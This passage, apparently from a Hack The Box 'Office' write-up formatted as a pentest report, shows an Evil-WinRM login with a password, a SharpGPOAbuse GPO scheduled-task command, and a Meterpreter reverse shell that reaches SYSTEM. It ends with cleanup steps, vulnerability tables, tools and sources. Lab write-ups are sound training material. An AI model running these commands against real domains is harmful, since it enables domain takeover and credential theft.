+└─$ evil-winrm -i office.htb -u hhogan -p &#39;H4ppyFtW183#&#39;                         
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\HHogan\Documents&gt;
+</div>
+<h2 id="privilege-escalation-nt-authoritysystem">Privilege escalation (NT AUTHORITY\SYSTEM)</h2>
+<p>Now that we have access to hhogan, we can try to gain admin privileges to the DC by editing the Default Domain Policy. With SharpGPOAbuse.exe, we can create a task that will run our malicious executable as NT AUTHORITY\SYSTEM :</p>
+<div class="codeBlock">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; .\SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;Install Updates&quot; --Author NT AUTHORITY\SYSTEM --Command &quot;cmd.exe&quot; --Arguments &quot;/c C:\Windows\Temp\m2.exe&quot; --GPOName &quot;Default Domain Policy&quot;
+[+] Domain = office.htb
+[+] Domain Controller = DC.office.htb
+[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
+[+] GUID of &quot;Default Domain Policy&quot; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] Modifying \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
+[+] Done!
+</div>
+<p>Now, we can update the policies using gpupdate :</p>
+<div class="codeBlock">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; gpupdate
+Updating policy...
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+</div>
+<p>Finally, let’s take a look at our listener :</p>
+<div class="codeBlock">msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.86:4446 
+[*] Sending stage (200774 bytes) to 10.129.21.11
+[*] Meterpreter session 9 opened (10.10.14.86:4446 -&gt; 10.129.21.11:53920) at 2024-02-19 10:37:14 +0100
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</div>
+<p>We have now full control over the target DC.</p>
+<h1 id="clearing-tracks">Clearing tracks</h1>
+<table>
+  <thead>
+  <tr>
+    <th>Step</th>
+    <th>Tracks to remove</th>
+  </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Initial access - Remote Code Execution</td>
+      <td>- Remove m.exe from C:/Windows/Temp</td>
+    </tr>
+    <tr>
+      <td>Post-exploitation - Privilege escalations</td>
+      <td>
+        - Remove m2.exe from C:/Windows/Temp<br>
+        - Remove mimikatz from C:/Windows/Temp<br>
+        - Remove SharpGPOAbuse.exe C:/Windows/Temp<br>
+        - Restore Default Domain Policy GPO<br>
+        - Remove malicious .odt file from C:/xampp/htdocs/internal/applications<br>
+      </td>
+    </tr>
+  </tbody>
+</table>
+<h1 id="vulnerabilities-summary">Vulnerabilities summary</h1>
+<h2 id="joomla-api-improper-access-control">Joomla API improper access control</h2>
+<table>
+  <thead>
+    <tr>
+      <th>Field</th>
+      <th>Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Affected component</td>
+      <td>Joomla API</td>
+    </tr>
+    <tr>
+      <td>CVSS 3.0 score</td>
+      <td>5.3</td>
+    </tr>
+    <tr>
+      <td>Severity</td>
+      <td>MEDIUM</td>
+    </tr>
+    <tr>
+      <td>Attack vector</td>
+      <td>Network</td>
+    </tr>
+    <tr>
+      <td>Impact</td>
+      <td>
+        Allows an attacker to retrieve sensitive information from the Joomla API such as the database credentials.<br>
+        <br>
+        This has a low impact on the confidentiality of the affected component.
+      </td>
+    </tr>
+    <tr>
+      <td>Remediation proposition</td>
+      <td>Update Joomla to version 4.2.8</td>
+    </tr>
+  </tbody>
+</table>
+<h2 id="password-reuse">Password reuse</h2>
+<table>
+  <thead>
+    <tr>
+      <th>Field</th>
+      <th>Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Affected component</td>
+      <td>dwolfe user account</td>
+    </tr>
+    <tr>
+      <td>CVSS 3.0 score</td>
+      <td>5.3</td>
+    </tr>
+    <tr>
+      <td>Severity</td>
+      <td>MEDIUM</td>
+    </tr>
+    <tr>
+      <td>Attack vector</td>
+      <td>Network</td>
+    </tr>
+    <tr>
+      <td>Impact</td>
+      <td>
+        If an attacker compromise the Joomla MySQL account, he may be also able to login as dwolfe via SMB or another service.<br>
+        <br>
+        This has a low impact on the confidentiality of the affected component.
+      </td>
+    </tr>
+    <tr>
+      <td>Remediation proposition</td>
+      <td>Set up stronger password policy</td>
+    </tr>
+  </tbody>
+</table>
+<h2 id="joomla-remote-code-execution">Joomla remote code execution</h2>
+<table>
+  <thead>
+    <tr>
+      <th>Field</th>
+      <th>Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Affected component</td>
+      <td>Joomla</td>
+    </tr>
+    <tr>
+      <td>CVSS 3.0 score</td>
+      <td>7.6</td>
+    </tr>
+    <tr>
+      <td>Severity</td>
+      <td>HIGH</td>
+    </tr>
+    <tr>
+      <td>Attack vector</td>
+      <td>Network</td>
+    </tr>
+    <tr>
+      <td>Impact</td>
+      <td>
+        Allows an attacker to execute arbitrary PHP code by adding a malicious payload in web pages when editing the Joomla templates.<br>
+        <br>
+        This has a high impact on the confidentiality and a low impact on the integrity and availability of the affected component.
+      </td>
+    </tr>
+    <tr>
+      <td>Remediation proposition</td>
+      <td>Set up a WAF to detect and block malicious traffic</td>
+    </tr>
+  </tbody>
+</table>
+<h2 id="weak-password">Weak password</h2>
+<table>
+  <thead>
+    <tr>
+      <th>Field</th>
+      <th>Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Affected component</td>
+      <td>tstark user account</td>
+    </tr>
+    <tr>
+      <td>CVSS 3.0 score</td>
+      <td>5.3</td>
+    </tr>
+    <tr>
+      <td>Severity</td>
+      <td>MEDIUM</td>
+    </tr>
+    <tr>
+      <td>Attack vector</td>
+      <td>Network</td>
+    </tr>
+    <tr>
+      <td>Impact</td>
+      <td>
+        Allows an attacker to find the password of tstark user account by cracking its hash.<br>
+        <br>
+        This has a low impact on the confidentiality of the affected component.
+      </td>
+    </tr>
+    <tr>
+      <td>Remediation proposition</td>
+      <td>Set up a stronger password policy.</td>
+    </tr>
+  </tbody>
+</table>
+<h2 id="libreoffice-remote-code-execution">LibreOffice remote code execution</h2>
+<table>
+  <thead>
+    <tr>
+      <th>Field</th>
+      <th>Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Affected component</td>
+      <td>Internal web application</td>
+    </tr>
+    <tr>
+      <td>CVSS 3.0 score</td>
+      <td>5.3</td>
+    </tr>
+    <tr>
+      <td>Severity</td>
+      <td>MEDIUM</td>
+    </tr>
+    <tr>
+      <td>Attack vector</td>
+      <td>Local</td>
+    </tr>
+    <tr>
+      <td>Impact</td>
+      <td>
+        If an attacker sends a malicious .odt file, he is able to execute arbitrary command when a user open its resume.<br>
+        <br>
+        This has a low impact on the confidentiality, integrity and availability of the affected component.
+      </td>
+    </tr>
+    <tr>
+      <td>Remediation proposition</td>
+      <td>Update LibreOffice to the latest version</td>
+    </tr>
+  </tbody>
+</table>
+<h1 id="tools-used">Tools used</h1>
+<table>
+  <thead>
+    <tr>
+      <th>Tool</th>
+      <th>Purpose</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Nmap</td>
+      <td>
+        - Scan for open ports<br>
+        - Scan for services versions<br>
+      </td>
+    </tr>
+    <tr>
+      <td>Metasploit Framework</td>
+      <td>
+        - Run exploits against the target<br>
+        - Manage meterpreter sessions<br>
+        - Run post-exploitation modules<br>
+      </td>
+    </tr>
+    <tr>
+      <td>SharpGPOAbuse</td>
+      <td>- Abuse GPO privileges to escalate privileges</td>
+    </tr>
+    <tr>
+      <td>Wireshark</td>
+      <td>- Read pcap files</td>
+    </tr>
+    <tr>
+      <td>Mimikatz</td>
+      <td>- Dump stored credentials</td>
+    </tr>
+    <tr>
+      <td>Evil-WinRM</td>
+      <td>- Log in via the WinRM service</td>
+    </tr>
+  </tbody>
+</table>
+<h1 id="sources">Sources</h1>
+<ul>
+  <li>Getting password from Kerberos pre-auth packet (ARSEQroast) : <a href="https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/">https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/</a></li>
+  <li>Joomla RCE : <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce</a></li>
+  <li>LibreOffice CVE-2023-2255 : <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2255">https://nvd.nist.gov/vuln/detail/CVE-2023-2255</a></li>
+  <li>CVE-2023-2255 exploit : <a href="https://github.com/elweth-sec/CVE-2023-2255">https://github.com/elweth-sec/CVE-2023-2255</a></li>
+  <li>Extracting password from DPAPI : <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords</a></li>
+</ul>
+</div>
